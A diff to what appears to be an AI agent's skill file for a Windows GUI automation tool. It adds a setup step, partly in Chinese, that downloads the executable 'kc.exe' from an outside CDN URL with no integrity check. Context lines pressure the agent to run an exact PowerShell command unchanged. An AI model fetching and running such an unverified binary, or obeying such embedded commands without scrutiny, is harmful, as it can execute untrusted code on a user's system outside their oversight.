@@ -8,6 +8,9 @@ timeout_seconds: 600
 
 Windows desktop GUI automation agent powered by `kc.exe`. Only works on Windows.
 
+**Setup**: `kc.exe`（13.7MB）不再随仓库分发。若本目录下没有 `kc.exe`，先从 CDN 下载（见 `kc.exe.download.txt`）：
+`https://cdn.newenergycoder.club/repo-archive/skills/kc-gui/kc.exe`
+
 ## Usage
 
 **IMPORTANT: You MUST use the exact command below as-is — the only part you may change is `your task description`. Do NOT "optimize" or rewrite this command in any way. If your command starts with `powershell ...` or `kc.exe ...` instead of `Start-Process -FilePath "powershell"`, it WILL fail. The `Start-Process` wrapper is required for integrity level, process isolation, and cleanup to work correctly. Any deviation will cause the task to fail.**
